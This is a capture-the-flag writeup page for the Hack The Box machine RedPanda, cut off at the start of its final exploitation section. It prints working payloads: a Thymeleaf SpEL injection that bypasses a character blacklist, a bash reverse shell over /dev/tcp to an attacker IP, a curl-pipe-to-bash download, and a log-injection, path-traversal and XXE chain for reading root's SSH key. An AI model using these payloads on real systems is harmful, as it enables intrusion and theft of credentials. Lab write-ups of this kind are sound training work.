@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RedPanda — Hack The Box Writeup — CyberMaks</title>
+  <meta name="description" content="RedPanda Hack The Box writeup — Thymeleaf SSTI with a character blacklist bypassed via *{} SpEL for RCE, then a root cron log parser abused with User-Agent log injection, double path traversal through an EXIF Artist tag, and XXE to read root's SSH key." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0b0f14;
+      --bg-2:     #0f1419;
+      --bg-3:     #141b22;
+      --bg-code:  #0d1117;
+      --border:   #1e2730;
+      --border-2: #253040;
+      --text:     #c8d0da;
+      --text-dim: #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:   #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:    #34c759;
+      --yellow:   #ff9f0a;
+      --red:      #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2rem;
+      height: 56px;
+      background: rgba(11,15,20,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-brand {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: 0.04em;
+    }
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      list-style: none;
+    }
+    .nav-links a {
+      font-size: 13px;
+      color: var(--text-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    .page-wrap {
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 100px 2rem 80px;
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      margin-bottom: 2.5rem;
+      letter-spacing: 0.03em;
+      transition: color 0.15s;
+    }
+    .back-link:hover { color: var(--accent); }
+    .back-link svg { width: 14px; height: 14px; }
+
+    .post-header { margin-bottom: 2.5rem; }
+
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      padding: 3px 9px;
+      border-radius: 3px;
+      text-transform: uppercase;
+    }
+    .badge-platform { background: rgba(77,157,224,0.1); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-medium   { background: rgba(255,159,10,0.1);  color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-easy     { background: rgba(52,199,89,0.08);  color: #34c759;       border: 1px solid rgba(52,199,89,0.2); }
+    .badge-tag      { background: rgba(255,255,255,0.04); color: var(--text-dim); border: 1px solid var(--border); }
+
+    .post-title {
+      font-family: var(--sans);
+      font-size: 28px;
+      font-weight: 600;
+      color: #e8edf3;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.75rem;
+    }
+    .post-date {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      letter-spacing: 0.04em;
+    }
+
+    .divider {
+      height: 1px;
+      background: var(--border);
+      margin: 2rem 0;
+    }
+
+    .chain-block {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--accent);
+      border-radius: 6px;
+      padding: 1.25rem 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .chain-block h3 {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1rem;
+    }
+    .chain-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .chain-step:last-child { margin-bottom: 0; }
+    .chain-arrow {
+      font-family: var(--mono);
+      color: var(--accent-dim);
+      font-size: 12px;
+      padding-top: 1px;
+      flex-shrink: 0;
+    }
+    .chain-text {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .section { margin-bottom: 2.5rem; }
+    .section-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.08em;
+      margin-bottom: 4px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #e8edf3;
+      letter-spacing: -0.2px;
+      margin-bottom: 1rem;
+    }
+    p { color: var(--text); margin-bottom: 0.85rem; }
+    p:last-child { margin-bottom: 0; }
+
+    .callout {
+      background: rgba(77,157,224,0.06);
+      border: 1px solid rgba(77,157,224,0.15);
+      border-left: 2px solid var(--accent);
+      border-radius: 4px;
+      padding: 0.85rem 1.1rem;
+      font-size: 13.5px;
+      color: var(--text);
+      margin: 1rem 0;
+    }
+    .callout.warn {
+      background: rgba(255,159,10,0.06);
+      border-color: rgba(255,159,10,0.15);
+      border-left-color: var(--yellow);
+    }
+    .callout.tip {
+      background: rgba(52,199,89,0.06);
+      border-color: rgba(52,199,89,0.15);
+      border-left-color: var(--green);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+      font-size: 13.5px;
+    }
+    thead tr { border-bottom: 1px solid var(--border-2); }
+    th {
+      font-family: var(--mono);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.07em;
+      color: var(--text-dim);
+      text-align: left;
+      padding: 8px 12px 8px 0;
+      font-weight: 400;
+    }
+    td {
+      padding: 8px 12px 8px 0;
+      color: var(--text);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 13px;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    td:first-child { color: var(--accent); }
+
+    .code-block { position: relative; margin: 1rem 0; }
+    .code-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+      padding: 6px 12px;
+    }
+    .code-lang {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-faint);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .copy-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      background: none;
+      border: none;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      transition: color 0.15s;
+      padding: 2px 4px;
+    }
+    .copy-btn:hover { color: var(--accent); }
+    pre {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 0 0 5px 5px;
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.65;
+      color: var(--text);
+    }
+    code {
+      font-family: var(--mono);
+      font-size: 12.5px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: var(--text);
+    }
+
+    .cm { color: var(--text-faint); }
+    .kw { color: var(--accent); }
+    .st { color: #a8d8a8; }
+    .nu { color: var(--yellow); }
+    .fn { color: #e0c9f5; }
+    .rd { color: var(--red); }
+
+    .creds-table td:first-child { color: var(--text-dim); }
+    .creds-table td:nth-child(2) { color: var(--red); }
+    .creds-table td:nth-child(3) { color: var(--text-dim); font-size: 12px; }
+
+    .takeaway {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 0.75rem;
+    }
+    .takeaway:last-child { margin-bottom: 0; }
+    .takeaway-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--accent);
+      flex-shrink: 0;
+      margin-top: 8px;
+    }
+    .takeaway-text { font-size: 14px; color: var(--text); }
+
+    .room-ref {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      letter-spacing: 0.03em;
+      display: inline-block;
+      margin-top: 6px;
+      transition: color 0.15s;
+    }
+    .room-ref:hover { color: var(--accent); }
+
+    .ref-link {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--accent-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .ref-link:hover { color: var(--accent); }
+
+    .vuln-table td:first-child  { color: var(--accent); }
+    .vuln-table td:nth-child(2) { color: var(--text-dim); font-size: 12.5px; }
+    .vuln-table td:nth-child(3) { color: var(--text-faint); font-size: 12px; }
+
+    footer {
+      border-top: 1px solid var(--border);
+      margin-top: 4rem;
+      padding-top: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .footer-brand {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+    }
+    .footer-links { display: flex; gap: 1.5rem; }
+    .footer-links a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--accent); }
+
+    @media (max-width: 600px) {
+      .nav-links { display: none; }
+      .post-title { font-size: 22px; }
+      footer { flex-direction: column; gap: 1rem; }
+    }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+    h3.sub { font-size: 15px; font-weight: 600; color: #e8edf3; margin: 1.5rem 0 0.75rem; }
+    ol.flow { margin: 0.5rem 0 1rem 1.25rem; }
+    ol.flow li { margin-bottom: 0.4rem; font-size: 14px; }
+    @media (max-width: 600px) { .page-wrap { padding: 90px 16px 60px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-brand" href="../index.html">CyberMaks</a>
+  <ul class="nav-links">
+    <li><a href="../index.html#case-studies">Case Studies</a></li>
+    <li><a href="../methodology.html">Methodology</a></li>
+    <li><a href="../about.html">About</a></li>
+    <li><a href="../index.html#tools">Tools</a></li>
+    <li><a href="../contact.html">Contact</a></li>
+  </ul>
+</nav>
+
+<div class="page-wrap">
+
+  <a class="back-link" href="../index.html">
+    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10 3L5 8l5 5"/>
+    </svg>
+    Case Studies
+  </a>
+
+  <header class="post-header">
+    <div class="post-meta">
+      <span class="badge badge-platform">Hack The Box</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-tag">ssti</span>
+      <span class="badge badge-tag">spring-boot</span>
+      <span class="badge badge-tag">path-traversal</span>
+      <span class="badge badge-tag">xxe</span>
+      <span class="badge badge-tag">cron-abuse</span>
+    </div>
+    <h1 class="post-title">RedPanda</h1>
+    <div class="post-date">2026-11-20</div>
+    <a class="room-ref" href="https://app.hackthebox.com/machines/RedPanda" target="_blank" rel="noopener">app.hackthebox.com/machines/RedPanda ↗</a>
+  </header>
+
+  <div class="chain-block">
+    <h3>Attack Chain</h3>
+    <div class="chain-step"><span class="chain-arrow">01</span><span class="chain-text">Nmap → Spring Boot search app on :8080 → /stats leaks woodenk &amp; damian</span></div>
+    <div class="chain-step"><span class="chain-arrow">02</span><span class="chain-text">SSTI in /search → $ _ ~ banned → bypass with *{...} SpEL expression</span></div>
+    <div class="chain-step"><span class="chain-arrow">03</span><span class="chain-text">Runtime.exec() → reverse shell as woodenk (group logs) → user flag</span></div>
+    <div class="chain-step"><span class="chain-arrow">04</span><span class="chain-text">pspy → root cron runs LogParser jar every 2 minutes</span></div>
+    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">User-Agent log injection → path traversal → EXIF Artist → our XML → XXE → /root/.ssh/id_rsa → root</span></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- SECTION 1 -->
+  <div class="section">
+    <div class="section-num">01 — Recon</div>
+    <h2>Nmap</h2>
+    <p>First things first — a port scan with default scripts to see what our attack surface actually is.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>sudo nmap -sS -sV -sC -F 10.129.99.184</pre>
+    </div>
+    <table>
+      <thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead>
+      <tbody>
+        <tr><td>22</td><td>OpenSSH 8.2p1</td><td>Ubuntu 20.04</td></tr>
+        <tr><td>8080</td><td>http-proxy</td><td>Red Panda Search | Made with Spring Boot</td></tr>
+      </tbody>
+    </table>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output — fingerprint-strings (trimmed)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>|_http-title: Red Panda Search | Made with Spring Boot
+|     &lt;meta author=<span class="st">"wooden_k"</span>&gt;
+|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;</pre>
+    </div>
+    <p>We haven't even opened the web page and we already have clues. The framework is <strong>Spring Boot</strong>, the main feature is searching for pandas, and Spring Boot means <strong>Java</strong> on the backend — keep that in mind, it decides which payloads we'll be writing later.</p>
+    <div class="shot">
+      <div class="sh"><span class="sl">10.129.99.184:8080</span><span class="ss">200 OK</span></div>
+      <img src="../assets/img/redpanda/01.png" alt="Red Panda Search landing page served by Spring Boot on port 8080 with a single search field" loading="lazy" />
+      <div class="sc">One input field. Everything that follows comes from it.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 2 -->
+  <div class="section">
+    <div class="section-num">02 — Web Enumeration</div>
+    <h2>Content Discovery</h2>
+    <p>Before testing the search, let's confirm there's nothing else exposed. dirsearch with its default wordlist:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>dirsearch -u http://10.129.99.184:8080</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output (trimmed)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>[21:08:32] 500 -   86B  - /error
+[21:08:45] 405 -  117B  - /search      <span class="cm"># POST only</span>
+[21:08:48] 200 -  987B  - <span class="st">/stats</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">10.129.99.184:8080/stats?author=woodenk</span><span class="ss">200 OK</span></div>
+      <img src="../assets/img/redpanda/02.png" alt="Stats page for author woodenk listing /img/greg.jpg, /img/hungy.jpg, /img/smooch.jpg and /img/smiley.jpg with zero views each, an Export table link, and author links woodenk and damian" loading="lazy" />
+      <div class="sc">Two authors, view counters per image, and an "Export table" link. Remember the view counter — it comes back for root.</div>
+    </div>
+    <p><code>/stats</code> gives us two usernames: <strong>woodenk</strong> and <strong>damian</strong>. I threw LFI payloads at the <code>author</code> parameter with different encodings — nothing. The endpoint works exactly as it should. Back to the search box.</p>
+  </div>
+
+  <!-- SECTION 3 -->
+  <div class="section">
+    <div class="section-num">03 — Foothold</div>
+    <h2>SSTI in /search</h2>
+    <p>Spring Boot developers love server-side templating engines (Thymeleaf most of the time). We put input into the search and it gets reflected straight back in the response — that's exactly the pattern for template injection.</p>
+
+    <div class="callout">
+      <strong>What is SSTI?</strong><br><br>
+      A template engine builds the page by merging a fixed template with dynamic data. That's safe as long as user input is passed <em>as data</em>. The bug appears when the developer concatenates input <em>into the template itself</em> — then the engine treats our text as template code and evaluates it on the server. Send <code>{{9*9}}</code>, get back <code>81</code> instead of the literal string, and you know the engine is running your expressions. From arithmetic to reading files and executing commands is usually a short walk — and unlike XSS, all of it happens on the server, not in someone's browser.<br><br>
+      <a class="ref-link" href="https://www.geeksforgeeks.org/computer-networks/what-is-server-side-template-injection/" target="_blank" rel="noopener">GeeksforGeeks: What is SSTI ↗</a>
+    </div>
+
+    <h3 class="sub">Detection</h3>
+    <p>First probe — the classic <code>${7*7}</code>. If the engine evaluates it, we see <code>49</code>.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -X POST http://10.129.99.184:8080/search --data-urlencode <span class="st">'name=${7*7}'</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — ${7*7}</span><span class="ss">banned</span></div>
+      <img src="../assets/img/redpanda/03.png" alt="Search result page: You searched for: Error occured: banned characters" loading="lazy" />
+      <div class="sc">A blacklist. Which means the developer already knew something here was dangerous.</div>
+    </div>
+    <p>The app bans some characters. Instead of guessing which ones, let ffuf find them — one character per request, match on the word <code>banned</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ffuf -u http://10.129.99.184:8080/search -X POST \
+     -H <span class="st">'Content-Type: application/x-www-form-urlencoded'</span> \
+     -d <span class="st">'name=FUZZ'</span> \
+     -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt \
+     -mr <span class="st">'banned'</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="rd">$</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]
+<span class="rd">_</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]
+<span class="rd">~</span>    [Status: 200, Size: 755, Words: 159, Lines: 29]</pre>
+    </div>
+
+    <div class="callout tip">Three banned symbols — and <code>$</code> is the only one that really mattered to them. Thymeleaf has more than one expression syntax: <code>${...}</code> variable, <code>*{...}</code> selection, <code>#{...}</code> message, <code>@{...}</code> link. <code>*{...}</code> evaluates SpEL exactly like <code>${...}</code>. Blacklisting one character of a four-character family isn't a filter, it's a suggestion.</div>
+
+    <p>Proof of concept with <code>#{7*7}</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -X POST http://10.129.99.184:8080/search --data-urlencode <span class="st">'name=#{7*7}'</span></pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — #{7*7}</span><span class="ss">evaluated</span></div>
+      <img src="../assets/img/redpanda/04.png" alt="Search result page: You searched for: ??49_en_US??" loading="lazy" />
+      <div class="sc"><code>??49_en_US??</code> — <code>#{}</code> is a message expression, so Thymeleaf looks up a message key called <code>49</code>, doesn't find it and wraps it in <code>??...??</code>. But it did the math first. SSTI confirmed.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section">
+    <div class="section-num">04 — RCE</div>
+    <h2>SpEL → Runtime.exec() → Reverse Shell</h2>
+    <p>Now that the vulnerability is confirmed, the goal is remote code execution. SpEL lets us reach any Java class through <code>T(...)</code>, so <code>java.lang.Runtime</code> is one expression away. The cleanest proof that commands run on the server: make the server send a request to a machine I control.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — attacker</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="cm"># shell.sh</span>
+bash -i &gt;&amp; /dev/tcp/10.10.15.118/1337 0&gt;&amp;1
+
+python3 -m http.server 8000     <span class="cm"># terminal 1 — serves shell.sh</span>
+nc -nvlp 1337                   <span class="cm"># terminal 2 — catches the shell</span></pre>
+    </div>
+
+    <p>First callback — a plain <code>wget</code>:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">spel</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>*{T(java.lang.Runtime).getRuntime().exec(<span class="st">'wget 10.10.15.118:8000/shell.sh'</span>)}</pre>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">POST /search — Runtime.exec()</span><span class="ss">Process spawned</span></div>
+      <img src="../assets/img/redpanda/05.png" alt="Search result page showing You searched for: Process[pid=2146, exitValue=&quot;not exited&quot;] after submitting a Runtime exec payload" loading="lazy" />
+      <div class="sc"><code>Process[pid=2146]</code> — the server literally tells us it started our process. The GET hit my http.server a second later.</div>
+    </div>
+
+    <p><code>Runtime.exec(String)</code> doesn't speak shell — no pipes, no redirects. Wrap the command in <code>/bin/sh -c</code> and pipe stdout back into the page with <code>IOUtils.toString()</code> so we can see what happens:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">spel — reverse shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{<span class="st">'/bin/sh'</span>,<span class="st">'-c'</span>,<span class="st">'curl -sS 10.10.15.118:8000/shell.sh | bash 2&gt;&amp;1'</span>}).getInputStream())}</pre>
+    </div>
+    <div class="callout warn">Send it through Burp or <code>curl --data-urlencode</code>. Pasting <code>|</code>, <code>&amp;</code> and <code>+</code> into a raw form body is how you spend twenty minutes debugging URL encoding instead of the target.</div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — listener</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>❯ nc -nvlp 1337
+Connection received on 10.129.99.184 34868
+woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /home/woodenk/user.txt
+<span class="st">1ca24039************************</span></pre>
+    </div>
+    <p>Shell as <code>woodenk</code>. User flag done.</p>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section">
+    <div class="section-num">05 — Privilege Escalation</div>
+    <h2>Recon as woodenk</h2>
+    <p><code>/opt</code> is where the application lives, so that's where I started grepping. The DB credentials are sitting in the controller source:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:/opt$ grep -r <span class="st">"RedPanda"</span>
+panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:
+    conn = DriverManager.getConnection(<span class="st">"jdbc:mysql://localhost:3306/red_panda"</span>, <span class="st">"woodenk"</span>, <span class="rd">"RedPanda*****"</span>);</pre>
+    </div>
+    <p>Password reuse — the same credentials work for SSH. A proper TTY makes life easier, but notice one difference between the two sessions:</p>
+    <div class="callout warn">The reverse shell came from the Java process, which runs as <code>woodenk</code> <strong>with group <code>logs</code></strong>. A fresh SSH session as <code>woodenk</code> doesn't get that group — groups belong to the process, not to the password. In practice <code>logs</code> only buys visibility: it lets us read <code>/opt/panda_search/redpanda.log</code> and <code>/credits</code> to check our work. The exploit itself doesn't need it — the web app writes the log line for us, and our files live in our own home directory.</div>
+
+    <h3 class="sub">pspy — what runs as root?</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:/tmp$ wget 10.10.15.118:8000/pspy64
+woodenk@redpanda:/tmp$ chmod +x pspy64 &amp;&amp; ./pspy64</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output — a couple of minutes later</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>CMD: UID=0  PID=2923 | /usr/sbin/CRON -f
+CMD: UID=0  PID=2924 | /bin/sh -c /root/run_credits.sh
+CMD: UID=0  PID=2926 | <span class="rd">java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</span></pre>
+    </div>
+    <p>A Java application, run by root, on a timer. And the name says <em>credit-score</em> — that's the "1 view = 1 creditpoint" counter from <code>/stats</code>. Something reads the logs and updates views as root. Let's read it.</p>
+  </div>
+
+  <!-- SECTION 6 -->
+  <div class="section">
+    <div class="section-num">06 — Source Analysis</div>
+    <h2>LogParser — App.java</h2>
+    <p>The source sits right next to the jar in <code>/opt/credit-score/LogParser/final/src/</code>. Here's the logic, trimmed to what matters:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">java — App.java (excerpt)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="kw">public static</span> Map <span class="fn">parseLog</span>(String line) {
+    String[] strings = line.<span class="fn">split</span>(<span class="st">"\\|\\|"</span>);          <span class="cm">// split on ||</span>
+    map.<span class="fn">put</span>(<span class="st">"status_code"</span>, Integer.<span class="fn">parseInt</span>(strings[<span class="nu">0</span>]));
+    map.<span class="fn">put</span>(<span class="st">"ip"</span>,          strings[<span class="nu">1</span>]);
+    map.<span class="fn">put</span>(<span class="st">"user_agent"</span>,  strings[<span class="nu">2</span>]);
+    map.<span class="fn">put</span>(<span class="st">"uri"</span>,         strings[<span class="nu">3</span>]);          <span class="cm">// index, not a parser</span>
+}
+
+<span class="kw">public static boolean</span> <span class="fn">isImage</span>(String filename) {
+    <span class="kw">return</span> filename.<span class="fn">contains</span>(<span class="st">".jpg"</span>);                <span class="cm">// anywhere in the line</span>
+}
+
+<span class="kw">public static</span> String <span class="fn">getArtist</span>(String uri) {
+    String fullpath = <span class="st">"/opt/panda_search/src/main/resources/static"</span> + <span class="rd">uri</span>;
+    <span class="cm">// ... reads EXIF, returns the "Artist" tag</span>
+}
+
+<span class="kw">public static void</span> <span class="fn">addViewTo</span>(String path, String uri) {
+    SAXBuilder saxBuilder = <span class="kw">new</span> <span class="fn">SAXBuilder</span>();       <span class="cm">// default config — DTDs allowed</span>
+    Document doc = saxBuilder.<span class="fn">build</span>(<span class="kw">new</span> File(path));
+    <span class="cm">// ... if &lt;uri&gt; matches: views++, totalviews++</span>
+    xmlOutput.<span class="fn">output</span>(doc, writer);                    <span class="cm">// writes the parsed doc back</span>
+}
+
+<span class="kw">public static void</span> <span class="fn">main</span>(String[] args) {
+    <span class="cm">// for every line in /opt/panda_search/redpanda.log:</span>
+    <span class="kw">if</span> (!<span class="fn">isImage</span>(line)) <span class="kw">continue</span>;
+    String artist  = <span class="fn">getArtist</span>(parsed.<span class="fn">get</span>(<span class="st">"uri"</span>));
+    String xmlPath = <span class="st">"/credits/"</span> + <span class="rd">artist</span> + <span class="st">"_creds.xml"</span>;
+    <span class="fn">addViewTo</span>(xmlPath, parsed.<span class="fn">get</span>(<span class="st">"uri"</span>));
+}</pre>
+    </div>
+
+    <p>So the idea is simple: the process runs as root, it builds file paths out of data we control, and then it parses an XML file that — thanks to those paths — is also ours. Every input in this chain is under our control. Step by step:</p>
+
+    <table class="vuln-table">
+      <thead><tr><th>Step</th><th>What root does</th><th>What we control</th></tr></thead>
+      <tbody>
+        <tr><td>1. Log line</td><td>splits on <code>||</code>, takes <code>[3]</code> as URI</td><td>User-Agent — inject our own <code>||</code> and shift the fields</td></tr>
+        <tr><td>2. Image path</td><td><code>static + uri</code></td><td><code>/../../../../home/woodenk/root.jpg</code> — traversal to our JPG</td></tr>
+        <tr><td>3. XML path</td><td><code>/credits/ + Artist + _creds.xml</code></td><td>EXIF Artist tag — second traversal to our XML</td></tr>
+        <tr><td>4. XML parse</td><td><code>SAXBuilder</code> with defaults</td><td>DOCTYPE with external entity → XXE</td></tr>
+        <tr><td>5. Write-back</td><td>saves the parsed doc</td><td>the expanded entity lands in a file we can read</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">data flow — one User-Agent to root's key</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -A <span class="st">'||/../../home/woodenk/root.jpg'</span>
+   │
+   ▼
+/opt/panda_search/redpanda.log        <span class="cm">// web app writes the line for us</span>
+   │  split("||")[3]
+   ▼
+uri = /../../home/woodenk/root.jpg    <span class="cm">// traversal #1</span>
+   │  getArtist()
+   ▼
+EXIF Artist = ../home/woodenk/root    <span class="cm">// traversal #2</span>
+   │  "/credits/" + artist + "_creds.xml"
+   ▼
+/home/woodenk/root_creds.xml          <span class="cm">// our XML, parsed by root</span>
+   │  SAXBuilder → &amp;example;
+   ▼
+<span class="rd">file:///root/.ssh/id_rsa</span>              <span class="cm">// XXE</span>
+   │  xmlOutput.output()
+   ▼
+/home/woodenk/root_creds.xml          <span class="cm">// key written back — we read it</span></pre>
+    </div>
+
+    <div class="callout">It's not classic LFI — we're not including anything. It's <strong>two path traversals</strong> that point root's file operations at files we wrote, followed by <strong>XXE</strong> that turns "parse this XML" into "read any file on the box". And since the program saves the document back to disk after counting views, it hands us the result in a file in our own home directory.</div>
+  </div>
+
+  <!-- SECTION 7 -->
+  <div class="section">
+    <div class="section-num">07 — Exploitation</div>
+    <h2>Log Injection → Traversal → XXE → id_rsa</h2>
+
